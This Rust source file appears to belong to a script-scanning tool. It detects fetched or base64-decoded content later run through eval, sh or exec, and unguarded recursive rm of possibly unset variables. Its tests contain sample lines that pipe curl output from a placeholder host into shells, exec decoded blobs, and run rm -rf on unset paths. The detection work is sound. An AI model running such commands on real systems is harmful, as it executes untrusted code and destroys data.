//! Following a value from where it is made to where it is run, across the
//! lines of one file: a shell variable set to what a fetch or a decoder
//! produced and later handed to a shell, and, in Python, JavaScript or
//! Lua, a variable set to a decode call and then given to `exec`/`eval`.
//!
//! The whole-file, textual tracking of fetched *files* lives in
//! `review::apply_rules`; this is the same idea for fetched and decoded
//! *content* held in a variable.

use std::collections::HashMap;

use super::shell::{self, program_name, unquoted_words};
use super::{RuleId, encoded, fetch};

/// Where a tracked value came from.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Source {
    Fetched,
    Decoded,
}

impl Source {
    const fn rule(self) -> RuleId {
        match self {
            Self::Fetched => RuleId::DownloadAndExecute,
            Self::Decoded => RuleId::EncodedCommandExecution,
        }
    }
}

/// The most assigned variables, and the most code variables, tracked
/// through one file.
const MAX_TRACKED: usize = 64;

/// How many lines after a decode assignment a run of it still counts, for
/// the code (non-shell) shapes where the two are usually adjacent.
const CODE_REACH: usize = 3;

/// Whether `value` is content brought in from the network: a fetch
/// substitution or a backtick fetch. A `< <(curl …)` on the statement is
/// asked for where the statement is read.
fn fetched_value(value: &str) -> bool {
    (value.starts_with("$(") || value.starts_with('`')) && fetch::text_fetches(value)
}

/// Whether `value` is content a decoder produced.
fn decoded_value(value: &str) -> bool {
    (value.starts_with("$(") || value.starts_with('`'))
        && (encoded::has_decoder(value) || value.contains("base64 -d"))
}

/// The shell variables a line runs, by name: `eval "$x"`, `bash -c "$x"`,
/// a here-string `sh <<< "$x"`, or printed into a shell (`echo "$x" | sh`,
/// `printf %s "$x" | bash`). The line is read once, however many variables
/// are followed.
fn run_names(line: &str) -> Vec<String> {
    let mut names: Vec<String> = Vec::new();
    let mut add = |word: &str| {
        names.extend(
            shell::referenced(word)
                .into_iter()
                .flatten()
                .map(ToString::to_string),
        );
    };
    for statement in shell::statements(line) {
        // Whether a shell reads what a part pipes on: from the end, so each
        // part's command is read once.
        let mut shell_after = false;
        for part in shell::pipeline(statement).into_iter().rev() {
            let Some(command) = shell::command(part) else {
                continue;
            };
            let is_shell = command.is_shell();
            // `eval "$x"`, `sh -c "$x"`; `echo "$x" | sh`, `printf %s "$x" |
            // bash`.
            if command.program == "eval"
                || (is_shell && command.has_short('c'))
                || (matches!(command.program.as_str(), "echo" | "printf") && shell_after)
            {
                for word in &command.arguments {
                    add(word);
                }
            }
            // `sh <<< "$x"`.
            if is_shell && part.contains("<<<") {
                let after = part.split("<<<").nth(1).unwrap_or_default();
                if let Some(rest) = shell::command(after)
                    && let Some(word) = rest.operands().next()
                {
                    add(word);
                }
                add(after.trim().trim_matches(['"', '\'']).trim());
                add(after);
            }
            shell_after = shell_after || is_shell;
        }
    }
    names
}

/// The shell variables that hold fetched or decoded content.
#[derive(Default)]
struct Held {
    /// Each name with what it holds, and a count that says which was given
    /// its content later.
    names: HashMap<String, (usize, Source)>,
    /// The names an assignment gave their content, the one held longest
    /// first: at most `MAX_TRACKED`. A name read from a fetch is not among
    /// them, and is held until it is given something else.
    assigned: Vec<String>,
    given: usize,
}

impl Held {
    fn hold(&mut self, name: String, source: Source) {
        self.assigned.retain(|known| *known != name);
        self.given += 1;
        self.names.insert(name, (self.given, source));
    }

    /// `name=$(…)`: follows `name` in place of what it held before. Past
    /// `MAX_TRACKED` assigned names the one held longest is let go.
    fn assign(&mut self, name: String, source: Source) {
        self.hold(name.clone(), source);
        self.assigned.push(name);
        if self.assigned.len() > MAX_TRACKED {
            let oldest = self.assigned.remove(0);
            self.names.remove(&oldest);
        }
    }

    /// `read name < <(curl …)`: follows `name` in place of what it held
    /// before. However many are read, none is let go: to stop following one
    /// would be to miss where it is run.
    fn read(&mut self, name: String) {
        self.hold(name, Source::Fetched);
    }

    /// Where the content of each held name among `run` came from, in the
    /// order the names were given it. Each name is looked up, so a line
    /// costs what it runs and not what is held.
    fn sources(&self, run: &[String]) -> Vec<Source> {
        let mut found: Vec<(usize, Source)> = run
            .iter()
            .filter_map(|name| self.names.get(name).copied())
            .collect();
        found.sort_by_key(|(given, _)| *given);
        found.dedup_by_key(|(given, _)| *given);
        found.into_iter().map(|(_, source)| source).collect()
    }
}

/// The findings from following values through `lines` (each lowercased,
/// comments blanked): a run of a variable that holds fetched or decoded
/// content, as (line number, rule).
pub(crate) fn findings(lines: &[String]) -> Vec<(usize, RuleId)> {
    let mut found = Vec::new();
    let mut held = Held::default();
    // Code variables holding a decode call, with the line they were set.
    let mut decoded: Vec<(String, usize)> = Vec::new();
    for (index, line) in lines.iter().enumerate() {
        for statement in shell::statements(line) {
            // Whether the statement reads a fetch (`< <(curl …)`), asked
            // once for all it assigns.
            let mut reads_fetch: Option<bool> = None;
            for (name, value) in shell::assignments(statement) {
                let source = if fetched_value(&value)
                    || *reads_fetch.get_or_insert_with(|| {
                        statement.contains("< <(") && fetch::text_fetches(statement)
                    }) {
                    Some(Source::Fetched)
                } else if decoded_value(&value) {
                    Some(Source::Decoded)
                } else {
                    None
                };
                if let Some(source) = source {
                    held.assign(name, source);
                }
            }
        }
        // `read -r x < <(curl …)`: the names are read, not assigned, and
        // the fetch sits in the process substitution the redirection reads.
        if line.contains("< <(") && fetch::text_fetches(line) {
            let before = line.split('<').next().unwrap_or_default();
            if let Some(command) = shell::command(before)
                && command.program == "read"
            {
                for name in command.operands() {
                    held.read(name.to_string());
                }
            }
        }
        if !held.names.is_empty() {
            for source in held.sources(&run_names(line)) {
                found.push((index + 1, source.rule()));
            }
        }

        // The code shapes: a decode assigned, then run within a few lines.
        if let Some(name) = encoded::assigned_decode(line) {
            decoded.push((name.to_string(), index));
            if decoded.len() > MAX_TRACKED {
                decoded.remove(0);
            }
        }
        for (name, set) in &decoded {
            if index > *set && index - *set <= CODE_REACH && encoded::runs_name(line, name) {
                found.push((index + 1, RuleId::EncodedCommandExecution));
            }
        }
    }
    found.extend(unset_variable_removals(lines));
    found
}

/// Variables a shell gives a build without a script setting them, so an
/// `rm -rf "$VAR"/...` of one empties the whole disk when it is unset.
const PROVIDED_VARIABLES: &[&str] = &["pkgdir", "srcdir", "startdir", "builddir"];

/// `rm -rf "$VAR"/...` where `VAR` is set nowhere in the file, or only
/// from a command substitution, and nothing guards it: no `set -u`, no
/// `${VAR:?}`, and it is not one of the directories a build is handed.
fn unset_variable_removals(lines: &[String]) -> Vec<(usize, RuleId)> {
    // A script that stops on an unset variable cannot reach the empty case.
    if lines.iter().any(|line| {
        let line = line.trim();
        ["set -u", "set -eu", "set -ue", "set -o nounset"]
            .iter()
            .any(|guard| line == *guard || line.starts_with(&format!("{guard} ")))
    }) {
        return Vec::new();
    }
    // Variables that cannot be empty when the script runs: set to a plain
    // value, or to the script's own `mktemp` path.
    let mut safe: std::collections::HashSet<String> = std::collections::HashSet::new();
    for line in lines {
        for statement in shell::statements(line) {
            for (name, value) in shell::assignments(statement) {
                let command_output = value.starts_with("$(") || value.starts_with('`');
                if value.contains("mktemp") || !command_output {
                    safe.insert(name);
                }
            }
        }
    }
    // Dangerous when it is not a provided build directory and is never
    // set to a non-empty value (so it is unset, or only a command's output).
    let empty_when_unset = |name: &str| !PROVIDED_VARIABLES.contains(&name) && !safe.contains(name);
    let mut found = Vec::new();
    for (index, line) in lines.iter().enumerate() {
        for statement in shell::statements(line) {
            if !is_recursive_rm(statement) {
                continue;
            }
            for word in unquoted_words(statement) {
                if let Some(name) = removal_target_variable(&word)
                    && empty_when_unset(&name)
                {
                    found.push((index + 1, RuleId::DestructiveSystemOperation));
                }
            }
        }
    }
    found
}

/// Whether a statement is a recursive `rm`.
fn is_recursive_rm(statement: &str) -> bool {
    let Some(command) = shell::command(statement) else {
        return false;
    };
    program_name(&command.program) == "rm"
        && (command.has_short('r') || command.arguments.iter().any(|word| word == "--recursive"))
}

/// The variable a removal target is rooted at, when the target deletes
/// everything under it (`"$VAR"/*`, `$VAR/`, `"${VAR}"/`). A `${VAR:?}`
/// guard, or anything before the variable, means it is not this shape.
fn removal_target_variable(word: &str) -> Option<String> {
    let trimmed = word.trim_matches(['"', '\'']);
    let core = trimmed
        .strip_suffix("/*")
        .or_else(|| trimmed.strip_suffix('/'))?;
    let name = core
        .strip_prefix("${")
        .and_then(|rest| rest.strip_suffix('}'))
        .or_else(|| core.strip_prefix('$'))?;
    (shell::is_name(name)).then(|| name.to_string())
}

#[cfg(test)]
mod tests {
    use super::super::RuleId;
    use super::{MAX_TRACKED, findings};

    fn run(text: &str) -> Vec<(usize, RuleId)> {
        let lines: Vec<String> = text.lines().map(str::to_lowercase).collect();
        findings(&lines)
    }

    #[test]
    fn a_fetched_variable_run_later_is_download_and_execute() {
        for text in [
            "x=$(curl -fssl https://x.example/i)\neval \"$x\"\n",
            "x=`wget -qo- https://x.example/i`\nbash -c \"$x\"\n",
            "payload=$(curl -s https://x.example/i)\nsh <<< \"$payload\"\n",
            "p=$(curl -s https://x.example/i)\necho \"$p\" | sh\n",
            "p=$(curl -s https://x.example/i)\nprintf %s \"$p\" | bash\n",
            "read -r cmd < <(curl -s https://x.example/i)\neval \"$cmd\"\n",
        ] {
            let found = run(text);
            assert!(
                found
                    .iter()
                    .any(|(_, rule)| *rule == RuleId::DownloadAndExecute),
                "{text:?} -> {found:?}"
            );
        }
        for text in [
            "x=$(curl -s https://x.example/v)\necho \"version $x\"\n",
            "x=$(curl -s https://x.example/v)\ntest -n \"$x\"\n",
            "x=$(date)\neval \"$x\"\n",
            "x=$(curl -s https://x.example/v)\ny=$x\n",
        ] {
            assert!(run(text).is_empty(), "{text:?} -> {:?}", run(text));
        }
    }

    #[test]
    fn rm_of_an_unset_variable_path_is_destructive() {
        for text in [
            "rm -rf \"$prefix\"/*\n",
            "rm -rf $dest/\n",
            "rm -rf \"${target}\"/\n",
            "out=$(find . -type d)\nrm -rf \"$out\"/*\n",
        ] {
            let found = run(text);
            assert!(
                found
                    .iter()
                    .any(|(_, rule)| *rule == RuleId::DestructiveSystemOperation),
                "{text:?} -> {found:?}"
            );
        }
        for text in [
            // Assigned a literal, guarded, a build directory, or set -u.
            "prefix=/opt/x\nrm -rf \"$prefix\"/*\n",
            "rm -rf \"${prefix:?}\"/*\n",
            "rm -rf \"$pkgdir\"/*\n",
            "rm -rf \"$srcdir\"/build\n",
            "tmp=$(mktemp -d)\nrm -rf \"$tmp\"/*\n",
            "set -eu\nrm -rf \"$prefix\"/*\n",
            "rm -rf \"$prefix\"\n",
            "rm -rf build/\n",
        ] {
            assert!(run(text).is_empty(), "{text:?} -> {:?}", run(text));
        }
    }

    #[test]
    fn a_decoded_variable_run_is_encoded_execution() {
        for text in [
            "d=$(echo ywjj | base64 -d)\neval \"$d\"\n",
            "code = base64.b64decode(blob)\nexec(code)\n",
            "src = zlib.decompress(blob)\nx = 1\nexec(src)\n",
            "local s = string.char(112, 114)\nload(s)()\n",
            "const js = atob(blob)\neval(js)\n",
        ] {
            let found = run(text);
            assert!(
                found
                    .iter()
                    .any(|(_, rule)| *rule == RuleId::EncodedCommandExecution),
                "{text:?} -> {found:?}"
            );
        }
        for text in [
            "code = base64.b64decode(blob)\nreturn code\n",
            // Too far apart.
            "code = base64.b64decode(blob)\na\nb\nc\nd\nexec(code)\n",
            "data = zlib.decompress(blob)\nsink(data)\n",
        ] {
            assert!(run(text).is_empty(), "{text:?} -> {:?}", run(text));
        }
    }

    #[test]
    fn a_name_read_again_is_followed_once() {
        // The same name read three times is one variable, and one finding
        // where it is run.
        let read = "read -r x < <(curl -s https://x.example/i)\n";
        assert_eq!(
            run(&format!("{read}{read}{read}eval \"$x\"\n")),
            [(4, RuleId::DownloadAndExecute)]
        );
        assert_eq!(
            run(&format!(
                "{read}x=$(curl -s https://x.example/i)\n{read}sh -c \"$x\"\n"
            )),
            [(4, RuleId::DownloadAndExecute)]
        );
        // What it is read from last is what it holds.
        assert_eq!(
            run(&format!("x=$(echo ywjj | base64 -d)\n{read}eval \"$x\"\n")),
            [(3, RuleId::DownloadAndExecute)]
        );
        assert_eq!(
            run(&format!("{read}x=$(echo ywjj | base64 -d)\neval \"$x\"\n")),
            [(3, RuleId::EncodedCommandExecution)]
        );
        // Several names on one line, each found where it is run.
        let found = run("read -r a b < <(curl -s https://x.example/i)\neval \"$b\" \"${a}\"\n");
        assert_eq!(
            found,
            [
                (2, RuleId::DownloadAndExecute),
                (2, RuleId::DownloadAndExecute)
            ]
        );
    }

    #[test]
    fn a_name_read_is_followed_however_many_are_read_after_it() {
        let reads = |count: usize| -> String {
            let lines: Vec<String> = (0..count)
                .map(|at| format!("read -r x{at} < <(curl -s https://x.example/{at})\n"))
                .collect();
            lines.concat()
        };
        // The first name read is still found where it is run, and so is
        // the last.
        for count in [MAX_TRACKED, MAX_TRACKED + 1, 10 * MAX_TRACKED] {
            let last = count - 1;
            let found = run(&format!(
                "{}eval \"$x0\"\neval \"$x{last}\"\n",
                reads(count)
            ));
            assert_eq!(
                found,
                [
                    (count + 1, RuleId::DownloadAndExecute),
                    (count + 2, RuleId::DownloadAndExecute)
                ],
                "{count}"
            );
        }
        // Of the names assigned, `MAX_TRACKED` are followed: the one held
        // longest is let go for the next.
        let assigned: Vec<String> = (0..=MAX_TRACKED)
            .map(|at| format!("x{at}=$(curl -s https://x.example/{at})\n"))
            .collect();
        let assigned = assigned.concat();
        assert!(run(&format!("{assigned}eval \"$x0\"\n")).is_empty());
        assert_eq!(run(&format!("{assigned}eval \"$x1\"\n")).len(), 1);
        // A name read is not let go for one assigned, before or after.
        let read = "read -r y < <(curl -s https://x.example/i)\n";
        for text in [
            format!("{read}{assigned}eval \"$y\"\n"),
            format!("{assigned}{read}{}eval \"$y\"\n", reads(MAX_TRACKED + 1)),
            // Read after it was assigned, it is no longer one of those.
            format!("y=$(echo ywjj | base64 -d)\n{read}{assigned}eval \"$y\"\n"),
        ] {
            let found = run(&text);
            assert_eq!(found.len(), 1, "{found:?}");
            assert_eq!(found[0].1, RuleId::DownloadAndExecute);
        }
        // Names run on one line are reported in the order they were given
        // their content.
        assert_eq!(
            run(&format!(
                "d=$(echo ywjj | base64 -d)\n{read}eval \"$y\" \"$d\" \"$y\"\n"
            )),
            [
                (3, RuleId::EncodedCommandExecution),
                (3, RuleId::DownloadAndExecute)
            ]
        );
    }

    #[test]
    fn many_reads_and_long_lines_cost_one_pass() {
        // Thousands of reads, of one name and of as many names.
        let names: Vec<String> = (0..4_000)
            .map(|at| format!("read -r y{at} < <(curl -s https://x.example/i)\n"))
            .collect();
        let mut text = names.concat();
        text.push_str(&"read -r x < <(curl -s https://x.example/i)\n".repeat(4_000));
        text.push_str("eval \"$x\"\neval \"$y3999\"\neval \"$y0\"\neval \"$z\"\n");
        assert_eq!(
            run(&text),
            [
                (8_001, RuleId::DownloadAndExecute),
                (8_002, RuleId::DownloadAndExecute),
                (8_003, RuleId::DownloadAndExecute)
            ]
        );
        // One line that names many, runs many, or pipes far.
        let held = "x=$(curl -s https://x.example/i)\n";
        let names = "a ".repeat(10_000);
        let text = format!("read {names}< <(curl -s https://x.example/i)\neval \"$a\"\n");
        assert_eq!(run(&text), [(2, RuleId::DownloadAndExecute)]);
        let text = format!("{held}eval {}\"$x\"\n", "\"$y\" ".repeat(10_000));
        assert_eq!(run(&text), [(2, RuleId::DownloadAndExecute)]);
        let text = format!("{held}echo \"$x\" {}| sh\n", "| cat ".repeat(10_000));
        assert_eq!(run(&text), [(2, RuleId::DownloadAndExecute)]);
        let text = format!("{held}echo \"$x\" {}\n", "| cat ".repeat(10_000));
        assert!(run(&text).is_empty());
        // Many assignments on a statement that reads a fetch.
        let text = format!(
            "local {}< <(curl -s https://x.example/i)\neval \"$b\"\n",
            "a=1 b=2 ".repeat(5_000)
        );
        assert_eq!(run(&text), [(2, RuleId::DownloadAndExecute)]);
    }
}
